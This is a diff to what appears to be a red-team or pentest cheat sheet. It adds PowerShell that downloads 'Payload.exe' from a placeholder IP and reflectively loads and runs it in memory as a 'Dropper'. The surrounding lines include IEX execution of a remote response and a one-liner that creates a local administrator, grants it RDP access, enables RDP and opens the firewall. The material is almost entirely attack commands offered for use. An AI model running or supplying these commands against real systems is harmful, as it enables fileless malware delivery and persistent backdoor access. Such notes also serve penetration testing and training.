@@ -143,7 +143,21 @@ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 
-### Add user to local admin and RDP group and enable RDP on firewall
+#### Reflective Load C Sharp binary
+- Make sure the class is public `public class Program`
+- Make sure the void Main is public `public static void Main(string[] args)`public static void Main(string[] args)`
+
+```
+$data = (New-Object System.Net.WebClient).DownloadData('http://XX.XX.XX.XX/Payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[<NAMESPACE>.<CLASS>]::Main("".Split())
+
+$data = (New-Object System.Net.WebClient).DownloadData('http://XX.XX.XX.XX/Payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Dropper.Program]::Main("".Split())
+```
+
+#### Add user to local admin and RDP group and enable RDP on firewall
 ```
 net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 ```
